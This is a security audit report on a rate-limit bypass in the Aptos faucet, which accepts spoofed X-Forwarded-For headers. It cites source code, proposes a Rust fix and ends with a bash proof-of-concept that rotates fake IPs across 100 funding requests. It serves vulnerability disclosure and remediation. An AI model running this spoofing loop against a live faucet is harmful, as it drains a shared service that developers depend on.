# Audit Report

## Title
Untrusted HTTP Header Acceptance Allows Rate Limit Bypass for Local Attackers in Aptos Faucet

## Summary
The Aptos faucet service unconditionally trusts `X-Forwarded-For` and `X-Real-IP` HTTP headers when determining the source IP address for rate limiting purposes. An attacker with local access to the faucet server can spoof these headers to bypass rate limits and make unlimited funding requests, potentially draining the faucet.

## Finding Description

The faucet's rate limiting mechanism relies on the source IP address extracted by poem's `RealIp` extractor. [1](#0-0)  The extractor checks `X-Forwarded-For` and `X-Real-IP` headers without validating whether the request originates from a trusted proxy.

The rate limiting logic applies limits per IP address: [2](#0-1)  Each unique IP tracked in the `ip_to_requests_today` map is rate-limited independently.

The faucet server binds to `0.0.0.0` by default, making it accessible from all network interfaces including localhost: [3](#0-2) 

**Attack Flow:**
1. Attacker gains local access to the faucet server machine (e.g., via compromised adjacent service, SSH access, or container escape)
2. Attacker sends HTTP requests directly to `localhost:8081` (or configured port)
3. Each request includes a different spoofed `X-Forwarded-For` header (e.g., `X-Forwarded-For: 1.2.3.4`, then `X-Forwarded-For: 5.6.7.8`, etc.)
4. The `RealIp` extractor uses the spoofed IP from the header: [4](#0-3) 
5. Rate limiter counts each spoofed IP separately
6. Attacker bypasses the daily request limit by rotating through different IPs

The architecture expects HAProxy to sit in front of the faucet and strip client-provided forwarding headers, but this is not enforced at the application level. If the faucet is directly accessible, header spoofing becomes trivial.

## Impact Explanation

This vulnerability meets **Medium Severity** criteria per Aptos bug bounty guidelines:
- **Limited funds loss or manipulation**: An attacker can drain the faucet by making unlimited funding requests, depleting testnet/devnet token supplies
- **State inconsistencies requiring intervention**: The faucet service may require manual intervention to restore proper operation if drained or if rate limiting data becomes corrupted

While faucet tokens typically have no mainnet value, this vulnerability can:
- Disrupt development/testing workflows by making the faucet unavailable
- Impact incentivized testnets where faucet tokens may have assigned value
- Enable griefing attacks against the Aptos ecosystem's developer experience
- Compromise operational availability of a critical developer infrastructure component

## Likelihood Explanation

**Likelihood: Medium to High** depending on deployment configuration.

The attack requires:
- Local access to the faucet server machine (achievable through various vectors: compromised adjacent service, SSH access, container escape, or insider threat)
- Basic HTTP client capabilities (curl, wget, or simple script)
- Knowledge of the faucet's local port (typically 8081 or 10212)

The vulnerability is exploitable in common deployment scenarios:
- Development/staging environments with relaxed security
- Container environments where multiple services share a host
- Misconfigured production deployments without proper network isolation
- Any scenario where the faucet is accessible without going through the reverse proxy

The barrier to exploitation is low once local access is achieved, requiring no special privileges or complex exploitation techniques.

## Recommendation

Implement trusted proxy validation to ensure only legitimate reverse proxy servers can set forwarding headers:

1. **Add trusted proxy IP configuration:**
```rust
pub struct ServerConfig {
    pub listen_address: String,
    pub listen_port: u16,
    pub api_path_base: String,
    pub trusted_proxies: Vec<IpAddr>,  // NEW: List of trusted proxy IPs
}
```

2. **Validate forwarding headers only from trusted sources:**
```rust
// In fund endpoint, replace RealIp with custom extraction:
async fn fund(
    &self,
    fund_request: Json<FundRequest>,
    asset: poem_openapi::param::Query<Option<String>>,
    peer_addr: &RemoteAddr,  // Use RemoteAddr instead of RealIp
    header_map: &HeaderMap,
) -> poem::Result<Json<FundResponse>, AptosTapErrorResponse> {
    let source_ip = extract_real_ip(peer_addr, header_map, &self.components.trusted_proxies);
    // ... rest of implementation
}

fn extract_real_ip(
    peer_addr: &RemoteAddr, 
    headers: &HeaderMap, 
    trusted_proxies: &[IpAddr]
) -> Option<IpAddr> {
    let peer_ip = peer_addr.0;
    
    // Only trust forwarding headers if peer is a trusted proxy
    if trusted_proxies.contains(&peer_ip) {
        // Check X-Forwarded-For, X-Real-IP
        if let Some(forwarded) = headers.get("X-Forwarded-For") {
            // Parse and return first IP in chain
        }
    }
    
    // Otherwise use actual peer address
    Some(peer_ip)
}
```

3. **Bind to localhost by default in configurations not behind a reverse proxy:** Modify the default to `127.0.0.1` for better security isolation.

4. **Document the reverse proxy requirement:** Clearly state in deployment documentation that the faucet MUST be deployed behind a trusted reverse proxy and MUST NOT be directly accessible.

## Proof of Concept

```bash
#!/bin/bash
# Exploit script demonstrating rate limit bypass via header spoofing

FAUCET_URL="http://localhost:8081/fund"
TARGET_ADDRESS="0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"

echo "Demonstrating rate limit bypass via X-Forwarded-For spoofing"

# Make requests that would normally be rate-limited
for i in {1..100}; do
    # Generate random IP for each request
    SPOOFED_IP="10.0.$((i / 256)).$((i % 256))"
    
    echo "Request $i with spoofed IP: $SPOOFED_IP"
    
    curl -X POST "$FAUCET_URL" \
        -H "Content-Type: application/json" \
        -H "X-Forwarded-For: $SPOOFED_IP" \
        -d "{\"address\": \"$TARGET_ADDRESS\", \"amount\": 10000}" \
        -s -o /dev/null -w "HTTP Status: %{http_code}\n"
    
    sleep 0.1
done

echo "All 100 requests completed - rate limit bypassed by IP spoofing"
```

Expected behavior: All 100 requests succeed because each appears to come from a different IP address.

Actual behavior without the fix: The rate limiter tracks each spoofed IP separately, allowing unlimited requests despite the configured daily limit.

## Notes

This vulnerability is specific to the faucet service and does not affect core blockchain consensus, Move VM execution, or on-chain components. However, it represents a significant operational security issue for the Aptos development infrastructure that could disrupt developer experience and testnet operations.

### Citations

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L107-108)
```rust
        // It takes into things like X-Forwarded-IP and X-Real-IP.
        source_ip: RealIp,
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L217-225)
```rust
        let source_ip = match source_ip.0 {
            Some(ip) => ip,
            None => {
                return Err(AptosTapError::new(
                    "No source IP found in the request".to_string(),
                    AptosTapErrorCode::SourceIpMissing,
                ))
            },
        };
```

**File:** crates/aptos-faucet/core/src/checkers/memory_ratelimit.rs (L68-91)
```rust
    async fn check(
        &self,
        data: CheckerData,
        dry_run: bool,
    ) -> Result<Vec<RejectionReason>, AptosTapError> {
        self.clear_if_new_day().await;

        let mut ip_to_requests_today = self.ip_to_requests_today.lock().await;

        let requests_today = ip_to_requests_today.get_or_insert_mut(data.source_ip, || 1);
        if *requests_today >= self.max_requests_per_day {
            return Ok(vec![RejectionReason::new(
                format!(
                    "IP {} has exceeded the daily limit of {} requests",
                    data.source_ip, self.max_requests_per_day
                ),
                RejectionReasonCode::UsageLimitExhausted,
            )]);
        } else if !dry_run {
            *requests_today += 1;
        }

        Ok(vec![])
    }
```

**File:** crates/aptos-faucet/core/src/server/server_args.rs (L22-24)
```rust
    fn default_listen_address() -> String {
        "0.0.0.0".to_string()
    }
```
